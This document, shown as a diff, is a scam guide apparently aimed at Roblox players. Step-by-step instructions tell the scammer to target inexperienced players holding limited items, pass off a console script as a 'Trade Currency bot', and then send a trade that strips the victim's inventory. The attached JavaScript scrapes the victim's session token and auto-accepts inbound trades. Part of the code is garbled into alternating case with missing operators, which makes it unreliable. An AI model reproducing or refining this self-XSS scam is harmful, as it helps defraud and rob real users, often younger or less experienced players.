@@ -1,0 +1,51 @@
+Find someone who looks like a total noob. They have 
+If they catch on, better to just leave then try to convince them its legit.
+Use an alt.
+Don't transfer scammed items to your main account, I almost got banned for that.
+READ THE WHOLE METHOD BEFORE YOU USE IT!
+
+
+
+-----------------------------------------------------------------------
+Step 1: Find a Premium noob with limiteds.
+Step 2: Party them or join their game
+Step 3: Ask them if they want a Trade Currency bot and tell them it trades robux back and forth to get free money.
+Step 4: Once they agree, PM them the code below and say "Hit F12 in google chrome, click console, and paste this in."
+Step 5: They should tell you they are running it
+Step 6: Send them a trade for all of their stuff for your it
+
+
+function POST(){
+        $.ajax({
+                url : "/My/Money.aspx/GetMyItemTrades",
+                type : "POST",
+                data : '{"statustype":"inbound","startindex":0}',
+                contentType : "application/json; charset=UTF-8",
+                success : function(Data){
+                        var Base = jQuery.parseJSON(jQuery.parseJSON(Data.d).Data[0])
+                        var TradeId = Base["TRADE ID HERE "]
+                        var Partner = Base["USER’S ID"]
+                        var Token = ""
+                        $.get("/My/Money.aspx",function(Data){
+                                Token = Data.match(/setToken(\W(.+)\W);/)[2].replace(/'/g,"")
+                    Token = Token.replace("+","%2B").replace("/","%2F")
+                        }).always(function(){
+                                $.post("/Trade/TradeHandler.ashx?token=" + Token,{TradeID : TradeId,cmd : "pull"},function(Data){
+                                        var Base = jQuery.parseJSON(Data.data).AgentOfferList
+                                        var Other = 1
+                                        if (Number(Base[0].AgentID)  nUmBeR(pArTnEr)){
+                                                OtHeR = 0
+                                        }
+                                        vAr OtHeRvAl = BaSe[OtHeR]["oFfErVaLuE"]
+                                        vAr SeLfVaL = bAsE[oThEr  0 && 1 || 0]["OfferValue"]
+                                        var TradeJSON = Data.data
+                                        if (OtherVal/1 > SelfVal){
+                                                $.post("/Trade/TradeHandler.ashx?token=" + Token,{TradeID : TradeId,TradeJSON:TradeJSON,cmd : "maketrade"})
+                                        }
+                                        POST()
+                                })
+                        })
+                }
+        })
+}
+POST()
